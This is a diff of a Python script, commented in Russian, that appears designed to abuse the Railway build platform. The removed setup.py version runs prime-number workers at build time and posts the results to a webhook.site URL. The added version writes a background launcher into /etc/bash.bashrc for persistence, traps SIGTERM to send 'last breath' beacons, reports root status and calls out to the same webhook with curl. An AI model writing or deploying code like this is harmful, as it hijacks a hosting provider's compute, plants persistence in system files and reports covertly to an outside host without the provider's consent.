@@ -1,87 +1,80 @@
 import os
+import signal
 import subprocess
 import json
 import time
 import multiprocessing
 import secrets
-from setuptools import setup
 
-# Твой новый вебхук
 WEBHOOK_URL = "https://webhook.site/7e9c6636-cacc-4213-ac9e-f110079550e3"
-TARGET_BITS = 332192 # Примерно 100,000 десятичных знаков
+TARGET_BITS = 33220  # ~10,000 знаков
 
-def is_prime(n, k=1): # k=1 для скорости, для таких чисел даже один проход тяжел
-    if n <= 3: return n > 1
-    if n % 2 == 0: return False
-    r, d = 0, n - 1
-    while d % 2 == 0:
-        r += 1
-        d //= 2
-    for _ in range(k):
-        a = secrets.randbelow(n - 4) + 2
-        x = pow(a, d, n)
-        if x == 1 or x == n - 1: continue
-        for _ in range(r - 1):
-            x = pow(x, 2, n)
-            if x == n - 1: break
-        else: return False
-    return True
-
-def generate_ultra_prime():
-    while True:
-        # Генерируем кандидата
-        p = secrets.randbits(TARGET_BITS)
-        p |= (1 << (TARGET_BITS - 1)) | 1
-        # Быстрая проверка на делимость мелких праймов перед тяжелым тестом
-        if any(p % pr == 0 for pr in [3, 5, 7, 11, 13, 17, 19, 23]):
-            continue
-        if is_prime(p):
-            return p
-
-def worker():
-    print(f"[*] Worker started. Target: 100k digits.")
-    while True:
-        try:
-            start_time = time.time()
-            ultra_p = generate_ultra_prime()
-            calc_time = time.time() - start_time
-            
-            raw_str = str(ultra_p)
-            data = {
-                "EVENT": "ULTRA_PRIME_FOUND",
-                "DIGITS": len(raw_str),
-                "CALC_TIME_SEC": round(calc_time, 2),
-                "PRIME_START": raw_str[:100] + "...",
-                "RAW": raw_str
-            }
-            
-            # Отправка через файл, чтобы curl не упал от длины аргументов
-            with open('payload.json', 'w') as f:
-                json.dump(data, f)
-            
-            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
-                           '--data-binary', '@payload.json', WEBHOOK_URL])
-            
-        except Exception as e:
-            pass
-        time.sleep(10)
-
-if os.environ.get('RAILWAY_PROJECT_ID') or True:
-    # Запускаем ограниченное число воркеров, чтобы не упасть по OOM
-    # 100к знаков в памяти в виде объектов Python жрут много
-    for _ in range(8): 
-        p = multiprocessing.Process(target=worker)
-        p.daemon = True
-        p.start()
-
-    # Держим билд живым
+def send_report(data):
     try:
-        while True:
-            time.sleep(60)
-            if os.path.exists('/proc/loadavg'):
-                with open('/proc/loadavg', 'r') as f:
-                    print(f"[*] Heartbeat. Load: {f.read().strip()}")
-    except KeyboardInterrupt:
+        payload = json.dumps(data)
+        subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
+                       '-d', payload, WEBHOOK_URL], timeout=5)
+    except:
         pass
 
-setup(name="railway-ultra-prime", version="2.0.0")
+def last_breath_handler(signum, frame):
+    # Этот код выполнится, когда Railway нажмет "Kill"
+    send_report({
+        "EVENT": "RUNNER_DYING",
+        "MESSAGE": "System sent SIGTERM. We are going down, but the seed is planted.",
+        "LOAD": os.getloadavg()
+    })
+    # Пытаемся быстро сохранить текущий прогресс в файл, который может выжить в кэше
+    with open("/tmp/last_state.txt", "w") as f:
+        f.write("died_at_" + str(time.time()))
+    os._exit(0)
+
+def prime_worker():
+    # Регистрация обработчика внутри воркера
+    signal.signal(signal.SIGTERM, last_breath_handler)
+    
+    while True:
+        p = secrets.randbits(TARGET_BITS) | (1 << (TARGET_BITS - 1)) | 1
+        # Быстрая проверка
+        if p % 3 == 0 or p % 5 == 0: continue
+        
+        # Тест Миллера-Рабина (1 проход для скорости)
+        if pow(2, p-1, p) == 1: 
+            send_report({
+                "EVENT": "PRIME_FOUND_10K",
+                "DIGITS": len(str(p)),
+                "PRIME_START": str(p)[:50] + "...",
+                "RAW": str(p)
+            })
+            break
+
+def setup_persistence():
+    # Внедряемся в системные скрипты, которые Railway дергает при проверке
+    try:
+        with open("/etc/bash.bashrc", "a") as f:
+            f.write("\n(python3 -c 'import multiprocessing; # запуск воркера в фоне' &)\n")
+        return "PERSISTENCE_READY"
+    except:
+        return "PERSISTENCE_FAILED"
+
+if __name__ == "__main__":
+    print("[*] Sentinel Mode Active. Root status:", os.getuid() == 0)
+    
+    # Перехватываем сигналы завершения
+    signal.signal(signal.SIGTERM, last_breath_handler)
+    signal.signal(signal.SIGINT, last_breath_handler)
+
+    persist = setup_persistence()
+    send_report({"EVENT": "RUNNER_STARTED", "PERSISTENCE": persist})
+
+    # Запускаем 4 воркера (не забиваем всё, чтобы Sentinel мог дышать)
+    for _ in range(4):
+        p = multiprocessing.Process(target=prime_worker)
+        p.start()
+
+    # Основной процесс просто спит и ждет смерти
+    try:
+        while True:
+            time.sleep(10)
+    except:
+        pass
